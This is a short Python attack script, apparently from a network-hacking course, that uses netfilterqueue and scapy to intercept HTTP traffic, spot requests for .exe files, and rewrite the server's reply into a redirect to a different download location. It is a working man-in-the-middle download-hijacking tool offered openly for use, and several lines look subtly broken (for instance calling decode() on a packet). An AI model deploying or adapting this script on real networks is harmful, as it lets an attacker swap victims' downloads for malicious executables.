#!/usr/bin/env python3
import netfilterqueue
import scapy.all as scapy

ack_list = []

def set_load(packet,load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

# processing packet for further changes, like now we are redirecting download to another download location
def process_packet(packet):
    # loading  packet with scapy
    scapy_packet = scapy.IP(packet.get_payload())
    print(scapy_packet.show())

    # check scapy packet if it has dns response
    # if scapy_packet.haslayer(scapy.Raw):
    if scapy.Raw in scapy_packet and scapy.TCP in scapy_packet:
        # checking if it is HTTP request by destination port (dport)
        if scapy_packet[scapy.TCP].dport == 10000:
            # checking request if contain any excutable file requested to download
            # you can change the type of file as u want like .pdf
            if ".exe" in scapy_packet[scapy.Raw].load.decode():
                print("[+] exe request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 10000:
            if scapy_packet[scapy_packet.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy_packet.TCP].seq)
                print("[+] Replacing file")
                modified_packet=set_load(scapy_packet.decode(),"HTTP/1.1 301 Moved Permanently\nLocation: http://www.win-rar.com/postdownload.html?&L=0&f=winrar-x64-590.exe&spV=true&subD=true \n\n")

                packet.set_payload(bytes(modified_packet))


    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

# the packet known it's response between large traffic through the
# seq field in the TCP section
# EXAMPLE so the request has ACK=X3X3
# the response will had seq=X3X3
# don't forget iptables
